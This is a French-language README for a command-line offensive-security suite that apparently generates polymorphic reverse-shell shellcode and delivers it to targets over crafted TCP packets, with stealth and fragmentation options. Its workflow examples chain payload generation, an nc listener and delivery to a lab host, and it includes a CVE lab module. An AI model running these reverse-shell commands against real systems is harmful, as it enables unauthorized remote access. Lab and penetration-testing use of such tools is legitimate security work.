# Packet Forger CLI - Interface Unifiée

## 🎯 Objectif

Interface unifiée pour tous les modules de Packet Forger Suite, similaire à Metasploit ou Impacket.

## ✨ Caractéristiques

- **Interface unique** : Un seul exécutable pour tous les modules
- **Sous-commandes** : `packet-forger <module> <action> [options]`
- **Détection automatique** : Trouve automatiquement les binaires des autres modules
- **Workflow fluide** : Génération et transport de payloads en chaîne
- **Mode verbeux** : Option `--verbose` ou `-V` pour plus de détails
- **Auto-complétion** : Support Bash et Zsh
- **Couleurs** : Messages colorés pour une meilleure lisibilité

## 🚀 Installation

### Installation avec sudo (recommandée pour système)

```bash
cd packet-forger-cli
make
sudo make install
```

### Installation sans sudo (utilisateur local)

```bash
cd packet-forger-cli
make
./install.sh
./setup_completion.sh
source ~/.zshrc  # Recharger la configuration
```

L'installation locale place les fichiers dans :
- Binaire : `~/.local/bin/packet-forger`
- Completion Zsh : `~/.zsh/completions/_packet-forger`
- Completion Bash : `~/.local/share/bash-completion/completions/packet-forger.bash`

**Important** : Assurez-vous que `~/.local/bin` est dans votre PATH.

### ⚠️ Utilisation avec sudo

Si `packet-forger` est installé dans `~/.local/bin` et que vous devez utiliser `sudo`, `sudo` ne trouvera pas la commande car `~/.local/bin` n'est pas dans son PATH.

**Solutions** :

1. **Utiliser le chemin complet** (recommandé) :
   ```bash
   sudo ~/.local/bin/packet-forger core send --payload /tmp/p3.bin --target 192.168.10.5 --port 80
   ```

2. **Préserver le PATH** :
   ```bash
   sudo -E env "PATH=$PATH" packet-forger core send --payload /tmp/p3.bin --target 192.168.10.5 --port 80
   ```

3. **Créer un alias** (ajoutez à `~/.zshrc`) :
   ```bash
   alias sudo-packet-forger='sudo env "PATH=$PATH" packet-forger'
   ```

Voir **[SUDO_WRAPPER.md](SUDO_WRAPPER.md)** pour plus de détails.

## 💻 Utilisation

### Aide Principale

```bash
packet-forger --help
packet-forger --version
```

### Mode Verbose

Utilisez `--verbose` ou `-V` pour obtenir des détails complets sur les opérations, incluant les hexdumps et la construction étape par étape.

#### Pour la génération de payloads

Le mode verbose affiche :
- **Paramètres de génération** : Plateforme, type, listener, options
- **Étapes de génération** : Détails du processus (Linux/Windows, polymorphe, ASM)
- **Détails du payload** :
  - Taille totale
  - Magic bytes (4 premiers bytes)
  - Statistiques (bytes null, caractères imprimables)
  - **Hexdump complet** du payload généré
- **Après encodage XOR** : Hexdump du payload encodé

```bash
packet-forger --verbose payload build windows reverse --lhost 192.168.10.20 --lport 4444
```

**Exemple de sortie verbose (payloads)** :
```
[~] Paramètres de génération :
[~]   - Plateforme : windows
[~]   - Type : reverse
[~]   - Listener IP : 192.168.10.20
[~]   - Listener Port : 4444
[~] Démarrage de la génération...
[~] Génération shellcode Windows x64 (résolution dynamique API)...
[~] Génération terminée : 824 bytes générés

[~] ===== Détails du Payload =====
[~] Taille totale : 824 bytes
[~] Magic bytes (4 premiers): 0x48 0x31 0xc0 0x48
[~] Statistiques :
[~]   - Bytes null : 0 (0.0%)
[~]   - Caractères imprimables : 45 (5.5%)

[~] Payload complet (824 bytes):
[~] 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f
[~] ------------------------------------------------
[~] 0000: 48 31 c0 48 89 c2 48 89 c6 48 89 e7 48 83 ... |H1.H..H..H..H.|
...
```

#### Pour l'envoi de paquets (core)

Le mode verbose affiche :
- **Hexdump du payload brut** avant encapsulation
- **Détection du type de service** (HTTP/SMB/etc.)
- **Détails de l'encapsulation** : Taille avant/après, hexdump du payload encapsulé
- **Handshake TCP** : Numéros de séquence et d'acquittement
- **Construction IP étape par étape** :
  - Version, IHL, TOS
  - Total Length, ID, Flags (DF/MF)
  - TTL, Protocol, Checksum
  - Adresses source/destination
- **Construction TCP étape par étape** :
  - Ports source/destination
  - Numéros de séquence/acquittement
  - Flags (SYN, ACK, PSH, etc.)
  - Window Size
  - Calcul du checksum TCP
- **Hexdump complet du paquet final** (IP + TCP + Payload)

```bash
sudo ~/.local/bin/packet-forger --verbose core send --payload payload.bin --target 192.168.10.5 --port 80
```

**Exemple de sortie verbose (core)** :
```
[~] ===== Détails du Payload =====
[~] Taille : 824 bytes

[~] Payload brut (824 bytes):
[~] 0000: 48 31 c0 48 89 c2 48 89 c6 48 89 e7 48 83 ... |H1.H..H..H..H.|
...

[~] Type de service détecté : http (port 80)
[~] Encapsulation du payload (824 bytes) dans http...
[~] Payload encapsulé : 824 bytes -> 996 bytes

[~] Payload encapsulé (996 bytes):
[~] 0000: 47 45 54 20 2f 20 48 54 54 50 2f 31 2e 31 ... |GET / HTTP/1.1|
...

[~] Démarrage du handshake TCP (RFC 793)...
[~] Handshake TCP réussi : SEQ=1056676350, ACK=1234567890

[~] Construction du paquet IP/TCP...
[~]   - IP Header : 20 bytes
[~]   - TCP Header : 20 bytes
[~]   - Payload encapsulé : 996 bytes
[~]   - Taille totale estimée : 1036 bytes

[~] Construction de l'en-tête IP (RFC 791)...
[~]   - Version : 4
[~]   - IHL : 5 (20 bytes)
[~]   - Total Length : 1036 bytes
[~]   - ID : 0xd432
[~]   - TTL : 64
[~]   - Protocol : TCP (6)
[~]   - Source IP : 192.168.10.20
[~]   - Dest IP : 192.168.10.5
[~]   - IP Checksum : 0xabcd

[~] Construction de l'en-tête TCP (RFC 793)...
[~]   - Source Port : 12345
[~]   - Dest Port : 80
[~]   - Sequence Number : 0x3f0a123e (1056676350)
[~]   - Acknowledgment Number : 0x499602d2 (1234567890)
[~]   - Data Offset : 5 (20 bytes)
[~]   - Flags : PSH ACK
[~]   - Window Size : 65535
[~] Copie du payload TCP (996 bytes)...
[~] Calcul du checksum TCP (pseudo-header + TCP + payload)...
[~]   - TCP Checksum : 0xef12
[~] Paquet IP/TCP construit : 1036 bytes total

[~] ========================================
[~] Détails du Paquet IP/TCP
[~] ========================================
[~] ===== Header IP =====
[~] Version : 4
[~] IHL : 5 (header length: 20 bytes)
...
[~] ===== Header TCP =====
[~] Source Port : 12345
[~] Dest Port : 80
...
[~] Payload TCP : 996 bytes
[~] Payload TCP (996 bytes):
[~] 0000: 47 45 54 20 2f 20 48 54 54 50 2f 31 2e 31 ... |GET / HTTP/1.1|
...

[~] Paquet complet (IP + TCP + Payload) (1036 bytes):
[~] 0000: 45 00 04 0c d4 32 40 00 40 06 ab cd c0 a8 0a 14 ... |E....2@.@.....|
...
```

### Module Core (Transport)

```bash
# Aide du module
packet-forger core --help

# Transporter un payload
packet-forger core send --payload payload.bin --target 192.168.10.5 --port 80

# Avec options avancées et mode verbeux
packet-forger --verbose core send --payload p.bin --target 192.168.10.5 --port 445 \
    --transport-profile windows --stealth --fragment
```

### Module Payload (Génération)

```bash
# Aide du module
packet-forger payload --help

# Générer un reverse shell Windows
packet-forger payload build windows reverse \
    --lhost 192.168.10.20 --lport 4444 --output payload.bin

# Générer un reverse shell Linux polymorphe (mode verbeux)
packet-forger --verbose payload build linux reverse \
    --lhost 192.168.10.20 --lport 4444 --polymorphic
```

### Module Lab (CVEs)

```bash
# Lister les CVEs disponibles
packet-forger lab list

# Consulter la documentation d'un CVE
packet-forger lab show CVE-2015-1635

# Démarrer un serveur vulnérable
packet-forger lab server http
packet-forger lab server smb

# Tester un CVE (mode verbeux)
packet-forger --verbose lab test CVE-2015-1635
```

### Module Research (Documentation)

```bash
# Lister les sujets disponibles
packet-forger research list

# Consulter la documentation
packet-forger research show ASLR
packet-forger research show DEP_NX
packet-forger research show ROP
```

## 🔄 Auto-complétion

### Bash

L'auto-complétion est automatiquement installée dans `/etc/bash_completion.d/` lors de l'installation.

Pour l'activer manuellement :

```bash
source /etc/bash_completion.d/packet-forger.bash
# Ou
source completions/packet-forger.bash
```

### Zsh

L'auto-complétion est automatiquement installée dans `/usr/local/share/zsh/site-functions/` ou `~/.zsh/completions/` lors de l'installation.

Si installée dans `~/.zsh/completions/`, ajoutez à votre `~/.zshrc` :

```bash
fpath=(~/.zsh/completions $fpath)
autoload -U compinit && compinit
```

### Exemples d'auto-complétion

```bash
# Complétion des modules
packet-forger <TAB>
# → core payload lab research

# Complétion des actions
packet-forger payload <TAB>
# → build

# Complétion des plateformes
packet-forger payload build <TAB>
# → linux windows

# Complétion des fichiers .bin
packet-forger core send --payload <TAB>
# → Liste des fichiers .bin
```

## 🔗 Workflow Complet

### Exemple 1 : Génération + Transport

```bash
# 1. Générer le payload (mode verbeux)
packet-forger --verbose payload build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic --output /tmp/payload.bin

# 2. Mettre en écoute (dans un autre terminal)
nc -lvp 4444

# 3. Transporter le payload (mode verbeux)
sudo packet-forger --verbose core send \
    --payload /tmp/payload.bin \
    --target 192.168.10.5 \
    --port 80 \
    --transport-profile windows
```

### Exemple 2 : Pipeline (une seule commande)

```bash
# Générer et transporter en une commande
packet-forger payload build windows reverse \
    --lhost 192.168.10.20 --lport 4444 --output /tmp/p.bin && \
sudo packet-forger core send \
    --payload /tmp/p.bin --target 192.168.10.5 --port 80
```

## 🎨 Messages Colorés

Le CLI utilise des couleurs pour améliorer la lisibilité :

- **Cyan** `[*]` : Messages informatifs
- **Vert** `[+]` : Messages de succès
- **Jaune** `[!]` : Avertissements
- **Rouge** `[-]` : Erreurs
- **Bleu** `[~]` : Messages verbeux (uniquement avec `--verbose`)

## 🔧 Configuration

Le CLI détecte automatiquement les binaires des autres modules. Si nécessaire, vous pouvez définir des variables d'environnement :

```bash
export PACKET_FORGER_CORE_PATH=/chemin/vers/packet-forger-core
export PACKET_FORGER_PAYLOAD_PATH=/chemin/vers/packet-forger-payloads
```

## 📚 Documentation

- **[README principal](../README.md)** : Vue d'ensemble de la suite
- **[packet-forger-core/README.md](../packet-forger-core/README.md)** : Documentation du core
- **[packet-forger-payloads/README.md](../packet-forger-payloads/README.md)** : Documentation des payloads
- **[packet-forger-labs/README.md](../packet-forger-labs/README.md)** : Documentation des labs

## ⚠️ Avertissement

Cet outil est destiné **UNIQUEMENT** à des fins éducatives et de test autorisé.
